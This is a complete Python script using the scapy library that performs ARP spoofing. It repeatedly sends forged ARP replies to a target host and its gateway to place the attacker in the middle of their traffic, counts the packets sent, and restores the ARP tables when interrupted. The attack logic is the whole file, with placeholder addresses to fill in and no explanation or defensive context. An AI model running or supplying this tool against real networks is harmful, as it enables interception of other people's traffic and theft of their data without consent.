#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)    
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac_address = get_mac(target_ip)
    arp_response_packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac_address,psrc=spoof_ip) 
    scapy.send(arp_response_packet,verbose=False)


def restore(destination_ip,source_ip):
    destination_mac_address = get_mac(destination_ip)
    source_mac_address = get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac_address,psrc=source_ip,hwsrc=source_mac_address)
    scapy.send(packet,count=4,verbose=False)


sending_packets_count = 0
target_ip="target_ip"
gateway_ip="router_ip"

try:
    while True: 
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        sending_packets_count = sending_packets_count + 2
        print("\r[+] Sent packets: "+str(sending_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C...Resetting ARP Tables...Please Wait!! \n")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)


